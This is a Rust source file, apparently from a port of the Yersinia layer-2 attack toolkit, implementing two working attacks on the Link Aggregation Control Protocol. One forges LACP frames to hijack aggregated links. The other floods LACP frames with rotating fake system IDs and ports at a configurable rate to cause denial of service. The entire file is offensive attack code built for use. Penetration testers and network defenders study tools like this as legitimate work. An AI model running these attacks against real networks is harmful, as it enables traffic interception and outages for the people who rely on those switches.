//! LACP Attacks
use super::packet::LacpPacket;
use async_trait::async_trait;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

#[derive(Debug, Clone)]
pub struct LacpHijackAttack {
    pub system_id: [u8; 6],
    pub port: u16,
    pub key: u16,
}

impl LacpHijackAttack {
    pub fn new(system_id: [u8; 6], port: u16) -> Self {
        Self {
            system_id,
            port,
            key: 1,
        }
    }

    pub fn build_packet(&self) -> LacpPacket {
        LacpPacket::new(self.system_id, self.port, self.key)
    }
}

#[derive(Debug, Clone)]
pub struct LacpDosAttack {
    pub rate_pps: u32,
}

impl LacpDosAttack {
    pub fn new(rate: u32) -> Self {
        Self { rate_pps: rate }
    }
}

#[async_trait]
impl Attack for LacpHijackAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(1);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let lacp_packet = self.build_packet();
            let lacp_bytes = lacp_packet.to_bytes();

            let dst_mac = MacAddress([0x01, 0x80, 0xC2, 0x00, 0x00, 0x02]); // LACP multicast
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::SlowProtocols, lacp_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending LACP hijack packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "LACP Link Hijacking"
    }
}

#[async_trait]
impl Attack for LacpDosAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps.max(1) as u64);
        let mut port = 1u16;

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let system_id = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, (port % 256) as u8];
            let lacp_packet = LacpPacket::new(system_id, port, 1);
            let lacp_bytes = lacp_packet.to_bytes();

            let dst_mac = MacAddress([0x01, 0x80, 0xC2, 0x00, 0x00, 0x02]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::SlowProtocols, lacp_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(_e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            port = port.wrapping_add(1);
            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "LACP DoS"
    }
}
